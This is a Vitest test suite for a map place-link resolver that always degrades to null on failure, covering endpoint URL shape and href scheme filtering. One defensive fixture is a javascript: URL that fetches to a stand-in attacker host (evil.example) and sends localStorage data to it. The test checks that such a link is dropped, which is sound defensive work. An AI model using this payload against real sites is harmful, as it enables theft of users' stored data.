// @vitest-environment jsdom
//
// S284 — the client place-link resolver (`lib/place-resolve.ts`). The centerpiece guarantee: it
// NEVER throws and degrades to `null` on every failure mode (unconfigured Worker, non-200, thrown
// fetch, bad JSON, `ok:false`), so the import sheet always falls back to manual entry — which is why
// slice S-b ships before the Worker's /resolve route (S-a). Also proves the happy path returns hints.

import { describe, it, expect, beforeEach } from 'vitest';
import { resolvePlaceLink } from '@/lib/place-resolve';

const ORIGIN = 'https://worker.example.dev';
const URL = 'https://maps.app.goo.gl/abc';

function jsonRes(body: unknown, ok = true, status = 200): Response {
  return { ok, status, json: async () => body } as unknown as Response;
}

describe('resolvePlaceLink (S284) — never throws, degrades to null', () => {
  beforeEach(() => localStorage.clear());

  it('returns null (no fetch) when the Worker origin is unconfigured', async () => {
    let called = false;
    const fetchImpl = (async () => {
      called = true;
      return jsonRes({ ok: true });
    }) as unknown as typeof fetch;
    // Default origin = CONCIERGE_URL, which is '' in the test env (dormant build).
    expect(await resolvePlaceLink(URL, { fetchImpl })).toBeNull();
    expect(called).toBe(false);
  });

  it('returns hints on a 200 { ok:true } response, and requests the CONFIGURED endpoint (#9)', async () => {
    // #9 — the URL assertion is the wiring check. Everything else in this file is satisfied by
    // ANY fetch double answering ANY address, so the suite could not tell "asks the Worker for
    // /resolve" from "asks it for nothing of the sort": `resolvePlaceLink` is TOTAL and a wrong
    // address just becomes `null`, i.e. the same benign manual-fallback the unconfigured build
    // produces.
    //
    // What this DOES and does NOT catch, stated exactly, because the looser version of this
    // comment was wrong: it does NOT catch a misconfigured `NEXT_PUBLIC_CONCIERGE_URL` — this
    // test injects `origin` directly and never reads the env var. `deploy.yml:120` is what
    // hard-fails a value carrying a path. What this DOES catch is drift in the URL SHAPE, and
    // that matters precisely because `deploy.yml:118-119` justifies its own guard by asserting
    // "lib/place-resolve.ts builds `<value>/resolve`". Change the shape here and that guard's
    // rationale goes stale silently. This assertion is what keeps the two in step.
    const requested: string[] = [];
    const fetchImpl = (async (input: string) => {
      requested.push(input);
      return jsonRes({ ok: true, name: 'Fushimi Inari', lat: 34.9671, lng: 135.7727, finalUrl: 'https://www.google.com/maps/place/Fushimi' });
    }) as unknown as typeof fetch;
    const hints = await resolvePlaceLink(URL, { fetchImpl, origin: ORIGIN });
    expect(hints).toEqual({
      name: 'Fushimi Inari',
      lat: 34.9671,
      lng: 135.7727,
      finalUrl: 'https://www.google.com/maps/place/Fushimi',
    });
    expect(requested).toEqual([`${ORIGIN}/resolve?url=${encodeURIComponent(URL)}`]);
  });

  it('strips ONE trailing slash off the origin, which deploy.yml relies on (#9)', async () => {
    // `deploy.yml:123` permits a trailing slash on NEXT_PUBLIC_CONCIERGE_URL with the comment
    // "One trailing slash is fine: place-resolve strips it". Nothing exercised that: every other
    // case here passes a slash-free ORIGIN, so the `replace(/\/+$/, '')` was a no-op under test
    // and could have been deleted with the suite still green.
    const requested: string[] = [];
    const fetchImpl = (async (input: string) => {
      requested.push(input);
      return jsonRes({ ok: true, name: 'Fushimi Inari' });
    }) as unknown as typeof fetch;
    await resolvePlaceLink(URL, { fetchImpl, origin: `${ORIGIN}/` });
    expect(requested).toEqual([`${ORIGIN}/resolve?url=${encodeURIComponent(URL)}`]);
  });

  it('drops a finalUrl whose scheme is not in the href allow-list, keeping the rest of the hints', async () => {
    // `finalUrl` is stored on the MyPlace and rendered as a live `<a href>`; `cleanStr`
    // (trimmed-non-empty) was the ONLY filter, so a hostile/compromised Worker could hand the
    // client a `javascript:` href on an origin with no CSP, a Firebase session and every trip key
    // in localStorage. The name/coords are still usable, so only the URL is dropped.
    const fetchImpl = (async () =>
      jsonRes({
        ok: true,
        name: 'Fushimi Inari',
        lat: 34.9671,
        finalUrl: "javascript:fetch('https://evil.example/?'+localStorage.getItem('nepal_japan_itinerary'))",
      })) as unknown as typeof fetch;
    const hints = await resolvePlaceLink(URL, { fetchImpl, origin: ORIGIN });
    expect(hints).not.toBeNull();
    expect(hints!.finalUrl).toBeUndefined();
    expect(hints!.name).toBe('Fushimi Inari');
    expect(hints!.lat).toBe(34.9671);
  });

  it('returns null on a non-200 response (manual fallback)', async () => {
    const fetchImpl = (async () => jsonRes({}, false, 404)) as unknown as typeof fetch;
    expect(await resolvePlaceLink(URL, { fetchImpl, origin: ORIGIN })).toBeNull();
  });

  it('returns null when { ok:false } comes back', async () => {
    const fetchImpl = (async () => jsonRes({ ok: false, reason: 'blocked-host' })) as unknown as typeof fetch;
    expect(await resolvePlaceLink(URL, { fetchImpl, origin: ORIGIN })).toBeNull();
  });

  it('returns null (never throws) when fetch rejects', async () => {
    const fetchImpl = (async () => {
      throw new Error('network down');
    }) as unknown as typeof fetch;
    await expect(resolvePlaceLink(URL, { fetchImpl, origin: ORIGIN })).resolves.toBeNull();
  });

  it('returns null (never throws) when the body is not JSON', async () => {
    const fetchImpl = (async () =>
      ({ ok: true, status: 200, json: async () => { throw new Error('bad json'); } })) as unknown as typeof fetch;
    await expect(resolvePlaceLink(URL, { fetchImpl, origin: ORIGIN })).resolves.toBeNull();
  });
});
